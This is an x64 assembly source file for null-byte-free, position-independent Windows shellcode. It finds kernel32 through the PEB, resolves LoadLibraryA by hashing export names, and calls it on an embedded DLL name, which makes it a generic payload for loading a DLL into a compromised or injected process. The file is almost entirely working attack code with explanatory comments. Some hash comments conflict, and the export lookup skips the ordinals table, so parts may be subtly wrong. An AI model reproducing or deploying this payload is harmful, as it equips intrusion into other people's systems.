;
; shLoadLibraryA-x64.asm
;
; refer to https://en.wikipedia.org/wiki/Win32_Thread_Information_Block for details
; also, TEB and PEB can be studied with expression (_TEB*)fs in Visual Studio "Watch" windows during debug.
; and moreover, some Reserved structure fields names can be obtained with pdbdump utility on MS pdbs with public symbols.
;

public shLoadLibraryA
public dllName

.code

    shLoadLibraryA proc
        sub     rsp, 028h               ;// 40 bytes of shadow space: 32 for RCX, RDX, R8 and R9 registers, and 8 bytes.
                                        ;// To align the stack from previous usage - the return RIP address pushed on the stack.
        and     rsp, 0fffffffffffffff0h ;// Align the stack to a multiple of 16 bytes.

        mov     rax, rsp                ;// 1. get the pointer to accessible memory in the stack, it will be referenced in step 3 below.
        call    $+4                     ;// 2. e8 ff ff ff ff  [after this call RIP will point to the last ff byte in this instruction].
        db      030h                    ;// 3. ff 30 -> push qword ptr [rax].
        pop     rax                     ;// 4. retore stack pointer after previos instruction.
        pop     rax                     ;// 5. pop the value that was pushed by call.
        sub     rax, 010h               ;// 6. rax is now holding the pointer to the beginning of the shLoadLibraryA code.

        mov     r15, rax                ;// Store the shLoadLibraryA base pointer in r15.
        mov     rcx, 0 - (getKernel32Base - shLoadLibraryA)
        neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getKernel32Base symbol.
        add     rax, rcx                ;// Make the address of the getKernel32Base symbol absolute by adding the base address to it.
        call    rax                     ;// Call getKernel32Base, after the call rax = pKernel32Base.

        mov     r10, r15                ;// Get the shLoadLibraryA base pointer and store it in r10.
        mov     rcx, 0 - (getProcAddressAsm - shLoadLibraryA)
        neg     rcx                     ;// To avoid null bytes. rcx = the relative offset of getProcAddressAsm symbol.
        add     r10, rcx                ;// Make the address of the getProcAddressAsm symbol absolute by adding the base address to it.
        mov     rcx, rax                ;// rcx = pKernel32Base, fist argument for the getProcAddressAsm function.
        mov     rdx, 07203081c80f2041h  ;// rdx = hash of "LoadLibraryA" string, obtained by shl13 hashing approach. Second pararmeter for getProcAddressAsm.
        call    r10                     ;// Call getProcAddressAsm, after the call rax = pLoadLibraryA, or zero.

      lSplit:
        mov     rcx, r15                ;// Get the shLoadLibraryA base pointer and store it in rcx. It will be fixed up later so, that it will point to dllName symbol.
        mov     rdx, 0 - (dllName - lSplit) ;// dllMain is more than 256 bytes away from the shLoadLibraryA, and this seem to be a problem for masm64, that's why
        neg     rdx                     ;// the first shellcode's chunk size is calculated here, and stored in rdx.
        mov     r12, 0 - (lSplit - shLoadLibraryA) ;// The second shellcode's chunk size is calculated here, and stored in r12.
        neg     r12                     ;// r12 = The size of the second chunk of the shellcode.
        add     rdx, r12                ;// rdx = The total size of the shellcode, from shLoadLibraryA symbol to dllName symbol.
        add     rcx, rdx                ;// Make the address of the dllName symbol absolute by adding the base address to it.
        call    rax                     ;// call LoadLibraryA(dllName)

        add     rsp, 028h
        ret
    shLoadLibraryA endp


    getKernel32Base proc
        push    rsi
        xor     rax, rax
        mov     rax, gs:[rax+060h]      ;// _TEB.Peb (_PEB* Peb)
        mov     rax, [rax+018h]         ;// _PEB.Ldr (_PEB_LDR_DATA* Ldr)
        mov     rsi, [rax+020h]         ;// _PEB_LDR_DATA.InLoadOrderModuleList (_LIST_ENTRY InLoadOrderModuleList)
        lodsq                           ;// _LDR_DATA_TABLE_ENTRY* of ntdll in eax
        mov     rsi, rax                ;// to avoid zeroes in code
        lodsq                           ;// _LDR_DATA_TABLE_ENTRY* of kernel32
        mov     rax, [rax+020h]         ;// _LDR_DATA_TABLE_ENTRY.DllBase
        pop	    rsi
        ret
    getKernel32Base endp


    ; rcx - image base
    ; rdx - shl13 hash
    getProcAddressAsm proc
        movsxd  rax, dword ptr [rcx+3Ch];// Skip over the MSDOS header to the start of the PE header. rax = PIMAGE_DOS_HEADER->e_lfanew.
        xor     r11d, r11d              ;// Counter ? 
        mov     rsi, rdx                ;// Store the 'shift left for 13 bits' hash of the function name in rsi.
        mov     r10, rcx                ;// Store the image base address in r10.
        mov     r13, 0 - 088h           ;// To avoid null bytes. In r13 the VA of IMAGE_DIRECTORY_ENTRY_EXPORT will be calculated by the next instructions.
        neg     r13                     ;// r13 = 088h. The IMAGE_DATA_DIRECTORY is 0x88 bytes from the start of the PE64 header.
        add     r13, rax                ;// Added the offset from the PE image base to the PE64 headers.
        add     r13, rcx                ;// Make the IMAGE_DIRECTORY_ENTRY_EXPORT address absolute by adding the base address to it.
        mov     r8d, [r13]              ;// Extract the relative address (RVA) of IMAGE_EXPORT_DIRECTORY, as it is the first one in IMAGE_DIRECTORY_ENTRY_EXPORT.
        mov     eax, [r8+rcx+20h]       ;// Extract the AddressOfNames table relative offset and store in eax.
        mov     edi, [r8+rcx+18h]       ;// Extract the NumberOfNames, number of exported items and store it in edi which will be used as the counter.
        mov     ebx, [r8+rcx+1Ch]       ;// Extract the AddressOfFunctions table relative offset, make this address absolute and store it in ebx.
        lea     r9, [rax+rcx]           ;// Make the AddressOfNames table address absolute by adding the base address to it. r9 = VA of AddressOfNames.  
        test    edi, edi                ;// If edi is zero then the last symbol has been checked and as such     
        je      lHashNotFound           ;// jump to the end of the function. If this condition is ever true then the requested symbol was not resolved properly.     
        sub     rbx, rax
      lNextFunction:
        mov     r8d, dword ptr [r9+rbx] ;// Extract relative offset (RVA) of the next function body.
        xor     rcx, rcx                ;// Hash accumulator. Will store the computed hash of the function name string.
        mov     edx, dword ptr [r9]     ;// Extract relative offset (RVA) of the next function name.
        add     r8, r10                 ;// Make the function body address absolute (RVA -> VA) by adding the image base address to it.
        add     rdx, r10                ;// Make the function name address absolute (RVA -> VA) by adding the image base address to it.
        ;je      lCompareHash            ; 74 16
      lNextChar:
        mov     rax, [rdx]              ;// To avoid null bytes.
        test    al, al                  ;// Test for the end of the function name.
        je      lCompareHash            ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
        movsx   rax, byte ptr [rdx]     ;// Get the next function name character to rax.
        shl     rcx, 0Dh                ;// Shift the current value of the hash 13 bits to the left.
        add     rcx, rax                ;// Add new character to the hash value.
        add     rdx, 1                  ;// Increment the character index pointer inside the function name string.
        jne     lNextChar               ;// Proceed to the next character in the function name.
      lCompareHash:
        cmp     rcx, rsi                ;// Check to see if the computed hash matches the requested hash.
        je      lHashFound              ;// If the hashes match, proceed to the return from this function.
        inc     r11d                    ;// Otherwise, continue enumerating the exported symbol list.
        add     r9, 4                   ;// Increment the pointer to the next offset (RVA) in the AddressOfFunctions table.
        cmp     r11d, edi               ;// Compare the current index in the AddressOfFunctions/AddressOfNames tables with PIMAGE_EXPORT_DIRECTORY->NumberOfNames.
        jb      lNextFunction           ;// If the value in edi is bigger than in r11d, then continue to the next exported symbol, otherwise
      lHashNotFound:                    ;// proceed to function's exit, setting the result to zero.
        xor     rax, rax                ;// The requested symbol was not resolved properly, return zero in this case.
      lReturn:
        ret
      lHashFound:
        mov     rax, r8                 ;// Move absolute address of the found funtion to rax register.
        jmp     lReturn
    getProcAddressAsm endp


    dllName	    db 0                    ;// "ws2_32.dll",0 ; To quickly test the shellcode, uncomment this instead of the zero in "db 0" expression. 


    stringToRor13Hash proc              ;// rcx - the pointer to the ascii string.
        mov     rsi, rcx                ;// ror13: 0xC6042601260A288D, rol13: 0x07203081c80f2041.
        xor     rdi, rdi                ;// Zero rdi as it will hold the hash value for the current symbols function name.
        xor     rax, rax                ;// Zero rax in order to ensure that the high order bytes are zero as this will hold the resulting hash.
        cld
      lComputeHash:
        lodsb                           ;// Load the byte at rsi, the current symbol name, into al and increment rsi.
        test    al, al                  ;// Bitwise test al with itself to see if the end of the string has been reached.
        jz      lHashFinished           ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
        ror     rdi, 0dh                ;// Rotate the current value of the hash 13 bits to the right.
        add     rdi, rax                ;// Add the current character of the symbol name to the hash accumulator.
        jmp     lComputeHash            ;// Continue looping through the symbol name.
      lHashFinished:
        mov		rax, rdi
        ret
    stringToRor13Hash endp


end